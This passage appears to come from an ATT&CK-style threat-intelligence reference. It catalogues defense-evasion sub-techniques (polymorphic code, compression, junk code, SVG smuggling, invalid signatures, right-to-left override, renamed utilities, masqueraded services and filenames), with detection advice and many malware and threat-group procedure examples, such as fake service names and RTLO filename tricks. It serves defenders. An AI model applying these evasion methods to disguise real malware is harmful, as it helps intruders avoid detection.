+- [S0394] HiddenWasp: HiddenWasp encrypts its configuration and payload.
+- [S1160] Latrodectus: Latrodectus has used a pseudo random number generator (PRNG) algorithm and a rolling XOR key to obfuscate strings.
+- [S0493] GoldenSpy: GoldenSpy's uninstaller has base64-encoded its variables.
+- [S0011] Taidoor: Taidoor can use encrypted string blocks for obfuscation.
+- [S0612] WastedLocker: The WastedLocker payload includes encrypted strings stored within the .bss section of the binary file.
+- [C0005] Operation Spalax: For Operation Spalax, the threat actors used XOR-encrypted payloads.
+- [S0141] Winnti for Windows: Winnti for Windows has the ability to encrypt and compress its payload.
+- [S0658] XCSSET: Older XCSSET variants use `xxd` to encode modules. Later versions pass an `xxd` or `base64` encoded blob through multiple decoding stages to reconstruct the module name, AppleScript, or shell command. For example, the initial network request uses three layers of hex decoding before executing a curl command in a shell.
+- [S0401] Exaramel for Linux: Exaramel for Linux uses RC4 for encrypting the configuration.
+- [G0050] APT32: APT32 has performed code obfuscation, including encoding payloads using Base64 and using a framework called "Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.
+- [S0698] HermeticWizard: HermeticWizard has the ability to encrypt PE files with a reverse XOR loop.
+- [S0168] Gazer: Gazer logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.
+- [C0029] Cutting Edge: During Cutting Edge, threat actors used a Base64-encoded Python script to write a patched version of the Ivanti Connect Secure `dsls` binary.
+- [S0601] Hildegard: Hildegard has encrypted an ELF file.
+- [S0180] Volgmer: A Volgmer variant is encoded using a simple XOR cipher.
+- [S1190] Kapeka: Kapeka utilizes AES-256 (CBC mode), XOR, and RSA-2048 encryption schemas for various configuration and other objects.
+- [S0581] IronNetInjector: IronNetInjector can obfuscate variable names, encrypt strings, as well as base64 encode and Rijndael encrypt payloads.
+- [S0266] TrickBot: TrickBot uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.
+- [S1113] RAPIDPULSE: RAPIDPULSE has the ability to RC4 encrypt and base64 encode decrypted files on compromised servers prior to writing them to stdout.
+- [S0022] Uroburos: Uroburos can use AES and CAST-128 encryption to obfuscate resources.
+- [S1044] FunnyDream: FunnyDream can Base64 encode its C2 address stored in a template binary with the `xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_-` or `xyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvw_=` character sets.
+- [S0347] AuditCred: AuditCred encrypts the configuration.
+- [S0587] Penquin: Penquin has encrypted strings in the binary for obfuscation.
+- [G1036] Moonstone Sleet: Moonstone Sleet has used encrypted payloads within files for follow-on execution and defense evasion.
+- [S0342] GreyEnergy: GreyEnergy encrypts its configuration files with AES-256 and also encrypts its strings.
+- [S0462] CARROTBAT: CARROTBAT has the ability to download a base64 encoded payload.
+- [S0230] ZeroT: ZeroT has encrypted its payload with RC4.
+- [S0348] Cardinal RAT: Cardinal RAT encodes many of its artifacts and is encrypted (AES-128) when downloaded.
+
+### T1027.014 - Obfuscated Files or Information: Polymorphic Code
+
+Description:
+
+Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution. With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools. Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as Software Packing, Command Obfuscation, or Encrypted/Encoded File.
+
+Procedures:
+
+- [S0574] BendyBear: BendyBear changes its runtime footprint during code execution to evade signature-based defenses.
+
+### T1027.015 - Obfuscated Files or Information: Compression
+
+Description:
+
+Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., Fileless Storage). In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload. File archives may be sent as one Spearphishing Attachment through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., Malicious File). However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user. Compression may be used in combination with Encrypted/Encoded File where compressed files are encrypted and password-protected.
+
+Procedures:
+
+- [S0453] Pony: Pony attachments have been delivered via compressed archive files.
+- [S0673] DarkWatchman: DarkWatchman has been delivered as compressed RAR payloads in ZIP files to victims.
+- [S0499] Hancitor: Hancitor has delivered compressed payloads in ZIP files to victims.
+- [S0148] RTM: RTM has been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.
+- [G0021] Molerats: Molerats has delivered compressed executables within ZIP files to victims.
+- [S1188] Line Runner: Line Runner uses a ZIP payload that is automatically extracted with its contents, a LUA script, executed for initial execution via CVE-2024-20359.
+- [G0027] Threat Group-3390: Threat Group-3390 malware is compressed with LZNT1 compression.
+- [S1050] PcShare: PcShare has been compressed with LZW algorithm.
+- [S0517] Pillowmint: Pillowmint has been compressed and stored within a registry key.
+- [S0466] WindTail: WindTail can be delivered as a compressed, encrypted, and encoded payload.
+- [S1183] StrelaStealer: StrelaStealer has been delivered via JScript files in a ZIP archive.
+- [S0559] SUNBURST: SUNBURST strings were compressed and encoded in Base64.
+- [S0665] ThreatNeedle: ThreatNeedle has been compressed and obfuscated.
+- [S1099] Samurai: Samurai can deliver its final payload as a compressed, encrypted and base64-encoded blob.
+- [S0141] Winnti for Windows: Winnti for Windows has the ability to encrypt and compress its payload.
+- [S0664] Pandora: Pandora has the ability to compress stings with QuickLZ.
+- [S1081] BADHATCH: BADHATCH can be compressed with the ApLib algorithm.
+- [G0126] Higaisa: Higaisa used Base64 encoded compressed payloads.
+- [S0697] HermeticWiper: HermeticWiper can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.
+- [S0444] ShimRat: ShimRat has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.
+- [S0662] RCSession: RCSession can compress and obfuscate its strings to evade detection on a compromised host.
+- [S0585] Kerrdown: Kerrdown can encrypt, encode, and compress multiple layers of shellcode.
+- [S0695] Donut: Donut can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.
+- [G1018] TA2541: TA2541 has used compressed and char-encoded scripts in operations.
+- [G0103] Mofang: Mofang has compressed the ShimRat executable within malicious email attachments.
+- [S1100] Ninja: Ninja has compressed its data with the LZSS algorithm.
+- [G0065] Leviathan: Leviathan has obfuscated code using gzip compression.
+- [S0666] Gelsemium: Gelsemium has the ability to compress its components.
+- [S1124] SocGholish: The SocGholish JavaScript payload has been delivered within a compressed ZIP archive.
+
+### T1027.016 - Obfuscated Files or Information: Junk Code Insertion
+
+Description:
+
+Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with Compression or Software Packing. No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them. The use of junk / dead code insertion is distinct from Binary Padding because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.
+
+Procedures:
+
+- [S0449] Maze: Maze has inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process.
+- [S0117] XTunnel: A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.
+- [S1183] StrelaStealer: StrelaStealer variants have included excessive mathematical functions padding the binary and slowing execution for anti-analysis and sandbox evasion purposes.
+- [G0046] FIN7: FIN7 has used random junk code to obfuscate malware code.
+- [G0047] Gamaredon Group: Gamaredon Group has obfuscated .NET executables by inserting junk code.
+- [S0248] yty: yty contains junk code in its binary, likely to confuse malware analysts.
+- [S0230] ZeroT: ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions.
+- [S0453] Pony: Pony obfuscates memory flow by adding junk instructions when executing to make analysis more difficult.
+- [S0370] SamSam: SamSam has used garbage code to pad some of its malware components.
+- [S0477] Goopy: Goopy's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.
+- [S0612] WastedLocker: WastedLocker contains junk code to increase its entropy and hide the actual code.
+- [S0137] CORESHELL: CORESHELL contains unused machine instructions in a likely attempt to hinder analysis.
+- [S0182] FinFisher: FinFisher contains junk code in its functions in an effort to confuse disassembly programs.
+- [G0050] APT32: APT32 includes garbage code to mislead anti-malware software and researchers.
+- [G0129] Mustang Panda: Mustang Panda has used junk code within their DLL files to hinder analysis.
+- [S0666] Gelsemium: Gelsemium can use junk code to hide functions and evade detection.
+- [S0223] POWERSTATS: POWERSTATS has used useless code blocks to counter analysis.
+- [S0512] FatDuke: FatDuke has been packed with junk code and strings.
+
+### T1027.017 - Obfuscated Files or Information: SVG Smuggling
+
+Description:
+
+Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files. SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include `` tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files. SVG smuggling can take a number of forms. For example, threat actors may include content that: * Assembles malicious payloads * Downloads malicious payloads * Redirects users to malicious websites * Displays interactive content to users, such as fake login forms and download buttons. SVG Smuggling may be used in conjunction with HTML Smuggling where an SVG with a malicious payload is included inside an HTML file. SVGs may also be included in other types of documents, such as PDFs.
+
+
+### T1036.001 - Masquerading: Invalid Code Signature
+
+Description:
+
+Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files. Unlike Code Signing, this activity will not result in a valid signature.
+
+Detection:
+
+Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.
+
+Procedures:
+
+- [S0466] WindTail: WindTail has been incompletely signed with revoked certificates.
+- [S0128] BADNEWS: BADNEWS is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.
+- [S0019] Regin: Regin stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.
+- [G0067] APT37: APT37 has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”
+- [G0112] Windshift: Windshift has used revoked certificates to sign malware.
+- [S0198] NETWIRE: The NETWIRE client has been signed by fake and invalid digital certificates.
+- [S1050] PcShare: PcShare has used an invalid certificate in attempt to appear legitimate.
+- [S0666] Gelsemium: Gelsemium has used unverified signatures on malicious DLLs.
+
+### T1036.002 - Masquerading: Right-to-Left Override
+
+Description:
+
+Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png. Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.
+
+Detection:
+
+Detection methods should include looking for common formats of RTLO characters within filenames such as \u202E, [U+202E], and %E2%80%AE. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it.
+
+Procedures:
+
+- [G0137] Ferocious Kitten: Ferocious Kitten has used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones.
+- [G0098] BlackTech: BlackTech has used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.
+- [G0004] Ke3chang: Ke3chang has used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.
+- [G0029] Scarlet Mimic: Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER has used Right-to-Left Override to deceive victims into executing several strains of malware.
+
+### T1036.003 - Masquerading: Rename Legitimate Utilities
+
+Description:
+
+Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython. It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe). An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.
+
+Detection:
+
+If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.
+
+Procedures:
+
+- [S1183] StrelaStealer: StrelaStealer has used a renamed, legitimate `msinfo32.exe` executable to sideload the StrelaStealer payload during initial installation.
+- [G0045] menuPass: menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool.
+- [G0032] Lazarus Group: Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe.
+- [S1111] DarkGate: DarkGate executes a Windows Batch script during installation that creases a randomly-named directory in the C:\\ root directory that copies and renames the legitimate Windows curl command to this new location.
+- [G1034] Daggerfly: Daggerfly used a renamed version of rundll32.exe, such as "dbengin.exe" located in the `ProgramData\Microsoft\PlayReady` directory, to proxy malicious DLL execution.
+- [G0050] APT32: APT32 has moved and renamed pubprn.vbs to a .txt file to avoid detection.
+- [G0082] APT38: APT38 has renamed system utilities, such as `rundll32.exe` and `mshta.exe`, to avoid detection.
+- [S0046] CozyCar: The CozyCar dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.
+- [S1020] Kevin: Kevin has renamed an image of `cmd.exe` with a random name followed by a `.tmpl` extension.
+- [G0093] GALLIUM: GALLIUM used a renamed cmd.exe file to evade detection.
+
+### T1036.004 - Masquerading: Masquerade Task or Service
+
+Description:
+
+Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones. Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.
+
+Detection:
+
+Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
+
+Procedures:
+
+- [S1033] DCSrv: DCSrv has masqueraded its service as a legitimate svchost.exe process.
+- [S0013] PlugX: In one instance, menuPass added PlugX as a service with a display name of "Corel Writing Tools Utility."
+- [G0143] Aquatic Panda: Aquatic Panda created new, malicious services using names such as Windows User Service to attempt to blend in with legitimate items on victim systems.
+- [S1064] SVCReady: SVCReady has named a task `RecoveryExTask` as part of its persistence activity.
+- [C0034] 2022 Ukraine Electric Power Attack: During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.
+- [C0017] C0017: During C0017, APT41 used `SCHTASKS /Change` to modify legitimate scheduled tasks to run malicious code.
+- [S0438] Attor: Attor's dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).
+- [S0449] Maze: Maze operators have created scheduled tasks masquerading as "Windows Update Security", "Windows Update Security Patches", and "Google Chrome Security Update" designed to launch the ransomware.
+- [S0495] RDAT: RDAT has used Windows Video Service as a name for malicious services.
+- [G0094] Kimsuky: Kimsuky has disguised services to appear as benign software or related to operating system functions.
+- [G0008] Carbanak: Carbanak has copied legitimate service names to use for malicious services.
+- [S1042] SUGARDUMP: SUGARDUMP's scheduled task has been named `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` or `MicrosoftEdgeCrashRepoeterTaskMachineUA`, depending on the Windows OS version.
+- [S0223] POWERSTATS: POWERSTATS has created a scheduled task named "MicrosoftEdge" to establish persistence.
+- [S0410] Fysbis: Fysbis has masqueraded as the rsyncd and dbus-inotifier services.
+- [S0688] Meteor: Meteor has been disguised as the Windows Power Efficiency Diagnostics report tool.
+- [S0169] RawPOS: New services created by RawPOS are made to appear like legitimate Windows services, with names such as "Windows Management Help Service", "Microsoft Support", and "Windows Advanced Task Manager".
+- [G0046] FIN7: FIN7 has created a scheduled task named “AdobeFlashSync” to establish persistence.
+- [S0629] RainyDay: RainyDay has named services and scheduled tasks to appear benign including "ChromeCheck" and "googleupdate."
+- [S0140] Shamoon: Shamoon creates a new service named “ntssrv” that attempts to appear legitimate; the service's display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.” Newer versions create the "MaintenaceSrv" service, which misspells the word "maintenance."
+- [S1013] ZxxZ: ZxxZ has been disguised as a Windows security update service.
+- [S1130] Raspberry Robin: Raspberry Robin will execute its payload prior to initializing command and control traffic by impersonating one of several legitimate program names such as dllhost.exe, regsvr32.exe, or rundll32.exe.
+- [S0471] build_downer: build_downer has added itself to the Registry Run key as "NVIDIA" to appear legitimate.
+- [S1031] PingPull: PingPull can mimic the names and descriptions of legitimate services such as `iphlpsvc`, `IP Helper`, and `Onedrive` to evade detection.
+- [S0491] StrongPity: StrongPity has named services to appear legitimate.
+- [S0345] Seasalt: Seasalt has masqueraded as a service called "SaSaut" with a display name of "System Authorization Service" in an apparent attempt to masquerade as a legitimate service.
+- [S0356] KONNI: KONNI has pretended to be the xmlProv Network Provisioning service.
+- [S0533] SLOTHFULMEDIA: SLOTHFULMEDIA has named a service it establishes on victim machines as "TaskFrame" to hide its malicious purpose.
+- [G1016] FIN13: FIN13 has used scheduled tasks names such as `acrotyr` and `AppServicesr` to mimic the same names in a compromised network's `C:\Windows` directory.
+- [G0099] APT-C-36: APT-C-36 has disguised its scheduled tasks as those used by Google.
+- [S1044] FunnyDream: FunnyDream has used a service named `WSearch` for execution.
+- [S1134] DEADWOOD: DEADWOOD will attempt to masquerade its service execution using benign-looking names such as ScDeviceEnums.
+- [S0527] CSPY Downloader: CSPY Downloader has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.
+- [S0439] Okrum: Okrum can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.
+- [S0022] Uroburos: Uroburos has registered a service named `WerFaultSvc`, likely to spoof the legitimate Windows error reporting service.
+- [S0444] ShimRat: ShimRat can impersonate Windows services and antivirus products to avoid detection on compromised systems.
+- [S0554] Egregor: Egregor has masqueraded the svchost.exe process to exfiltrate data.
+- [S0409] Machete: Machete renamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks.
+- [G0050] APT32: APT32 has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. APT32 has also impersonated the legitimate Flash installer file name "install_flashplayer.exe".
+- [G1035] Winter Vivern: Winter Vivern has distributed malicious scripts and executables mimicking virus scanners.
+- [S1011] Tarrask: Tarrask creates a scheduled task called “WinUpdate” to re-establish any dropped C2 connections.
+- [S0601] Hildegard: Hildegard has disguised itself as a known Linux process.
+- [G0102] Wizard Spider: Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries.
+- [S0668] TinyTurla: TinyTurla has mimicked an existing Windows service by being installed as Windows Time Service.
+- [S0663] SysUpdate: SysUpdate has named their unit configuration file similarly to other unit files residing in the same directory, `/usr/lib/systemd/system/`, to appear benign.
+- [G1002] BITTER: BITTER has disguised malware as a Windows Security update service.
+- [S0178] Truvasys: To establish persistence, Truvasys adds a Registry Run key with a value "TaskMgr" in an attempt to masquerade as the legitimate Windows Task Manager.
+- [S0148] RTM: RTM has named the scheduled task it creates "Windows Update".
+- [G0037] FIN6: FIN6 has renamed the "psexec" service name to "mstdc" to masquerade as a legitimate Windows service.
+- [S0630] Nebulae: Nebulae has created a service named "Windows Update Agent1" to appear legitimate.
+- [G0019] Naikon: Naikon renamed a malicious service taskmgr to appear to be a legitimate version of Task Manager.
+- [S0581] IronNetInjector: IronNetInjector has been disguised as a legitimate service using the name PythonUpdateSrvc.
+- [S1090] NightClub: NightClub has created a service named `WmdmPmSp` to spoof a Windows Media service.
+- [C0035] KV Botnet Activity: KV Botnet Activity installation steps include first identifying, then stopping, any process containing [kworker\/0:1], then renaming its initial installation stage to this process name.
+- [S0118] Nidiran: Nidiran can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.
+- [S0534] Bazar: Bazar can create a task named to appear benign.
+- [S0538] Crutch: Crutch has established persistence with a scheduled task impersonating the Outlook item finder.
+- [S0367] Emotet: Emotet has installed itself as a new service with the service name `Windows Defender System Service` and display name `WinDefService`.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D uses file naming conventions with associated executable locations to blend in with the macOS TimeMachine and OpenSSL services. Such as, naming a LaunchAgent plist file `com.apple.openssl.plist` which executes OSX_OCEANLOTUS.D from the user's `~/Library/OpenSSL/` folder upon user login.
+- [G0117] Fox Kitten: Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate.
+- [G0056] PROMETHIUM: PROMETHIUM has named services to appear legitimate.
+- [S0259] InnaputRAT: InnaputRAT variants have attempted to appear legitimate by adding a new service named OfficeUpdateService.
+- [C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda masqueraded Registry run keys as legitimate-looking service names such as `OneNote Update` during RedDelta Modified PlugX Infection Chain Operations.
+- [S0236] Kwampirs: Kwampirs establishes persistence by adding a new service with the display name "WMI Performance Adapter Extension" in an attempt to masquerade as a legitimate WMI service.
+- [C0040] APT41 DUST: APT41 DUST disguised DUSTPAN as a legitimate Windows binary such as `w3wp.exe` or `conn.exe`.
+- [S0261] Catchamas: Catchamas adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.
+- [C0001] Frankenstein: During Frankenstein, the threat actors named a malicious scheduled task "WinUpdate" for persistence.
+- [S1052] DEADEYE: DEADEYE has used `schtasks /change` to modify scheduled tasks including `\Microsoft\Windows\PLA\Server Manager Performance Monitor`, `\Microsoft\Windows\Ras\ManagerMobility, \Microsoft\Windows\WDI\SrvSetupResults`, and `\Microsoft\Windows\WDI\USOShared`.
+- [G0128] ZIRCONIUM: ZIRCONIUM has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary.
+- [S0690] Green Lambert: Green Lambert has created a new executable named `Software Update Check` to appear legitimate.
+- [S1140] Spica: Spica has created a scheduled task named `CalendarChecker` for persistence on compromised hosts.
+- [G0059] Magic Hound: Magic Hound has named a malicious script CacheTask.bat to mimic a legitimate task.
+- [S0607] KillDisk: KillDisk registers as a service under the Plug-And-Play Support name.
+- [C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 named tasks `\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager` in order to appear legitimate.
+- [S0343] Exaramel for Windows: The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV” in an apparent attempt to masquerade as a legitimate service.
+- [G0126] Higaisa: Higaisa named a shellcode loader binary svchast.exe to spoof the legitimate svchost.exe.
+- [G0032] Lazarus Group: Lazarus Group has used a scheduled task named `SRCheck` to mask the execution of a malicious .dll.
+- [S0180] Volgmer: Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.
+- [S0647] Turian: Turian can disguise as a legitimate service to blend into normal operations.
+- [S0260] InvisiMole: InvisiMole has attempted to disguise itself by registering under a seemingly legitimate service name.
+- [S0588] GoldMax: GoldMax has impersonated systems management software to avoid detection.
+- [S0126] ComRAT: ComRAT has used a task name associated with Windows SQM Consolidator.
+- [S1027] Heyoka Backdoor: Heyoka Backdoor has been named `srvdll.dll` to appear as a legitimate service.
+- [G0135] BackdoorDiplomacy: BackdoorDiplomacy has disguised their backdoor droppers with naming conventions designed to blend into normal operations.
+- [G0096] APT41: APT41 has created services to appear as benign system tools.
+- [S1070] Black Basta: Black Basta has established persistence by creating a new service named `FAX` after deleting the legitimate service by the same name.
+
+### T1036.005 - Masquerading: Match Legitimate Resource Name or Location
+
+Description:
+
+Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.
+
+Detection:
+
+Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect. If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection. In containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names. Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.
+
+Procedures:
+
+- [S0083] Misdat: Misdat saves itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.
+- [S0629] RainyDay: RainyDay has used names to mimic legitimate software including "vmtoolsd.exe" to spoof Vmtools.
+- [G0139] TeamTNT: TeamTNT has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software.
+- [S0459] MechaFlounder: MechaFlounder has been downloaded as a file named lsass.exe, which matches the legitimate Windows file.
+- [S1050] PcShare: PcShare has been named `wuauclt.exe` to appear as the legitimate Windows Update AutoUpdate Client.
+- [S0533] SLOTHFULMEDIA: SLOTHFULMEDIA has mimicked the names of known executables, such as mediaplayer.exe.
+- [S0081] Elise: If installing itself as a service fails, Elise instead writes itself as a file named svchost.exe saved in %APPDATA%\Microsoft\Network.
+- [S0072] OwaAuth: OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\; the malicious file by the same name is saved in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\.
+- [C0025] 2016 Ukraine Electric Power Attack: During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.
+- [S0482] Bundlore: Bundlore has disguised a malicious .app file as a Flash Player update.
+- [S0085] S-Type: S-Type may save itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.
+- [S1014] DanBot: DanBot files have been named `UltraVNC.exe` and `WINVNC.exe` to appear as legitimate VNC tools.
+- [S0687] Cyclops Blink: Cyclops Blink can rename its running process to [kworker:0/1] to masquerade as a Linux kernel thread. Cyclops Blink has also named RC scripts used for persistence after WatchGuard artifacts.
+- [G0047] Gamaredon Group: Gamaredon Group has used legitimate process names to hide malware including svchosst.
+- [S0668] TinyTurla: TinyTurla has been deployed as `w64time.dll` to appear legitimate.
+- [S1203] J-magic: J-magic can rename itself as “[nfsiod 0]” to masquerade as the local Network File System (NFS) asynchronous I/O server.
+- [S0484] Carberp: Carberp has masqueraded as Windows system file names, as well as "chkntfs.exe" and "syscron.exe".
+- [G1017] Volt Typhoon: Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.
+- [G0060] BRONZE BUTLER: BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.
+- [S1090] NightClub: NightClub has chosen file names to appear legitimate including EsetUpdate-0117583943.exe for its dropper.
+- [G1018] TA2541: TA2541 has used file names to mimic legitimate Windows files or system functionality.
+- [S1022] IceApple: IceApple .NET assemblies have used `App_Web_` in their file names to appear legitimate.
+- [S0171] Felismus: Felismus has masqueraded as legitimate Adobe Content Management System files.
+- [G0096] APT41: APT41 attempted to masquerade their files as popular anti-virus software.
+- [G1044] APT42: APT42 has masqueraded the VINETHORN payload as a VPN application.
+- [G1046] Storm-1811: Storm-1811 has disguised Cobalt Strike installers as a malicious DLL masquerading as part of a legitimate 7zip installation package.
+- [S0496] REvil: REvil can mimic the names of known executables.
+- [S0531] Grandoreiro: Grandoreiro has named malicious browser extensions and update files to appear legitimate.
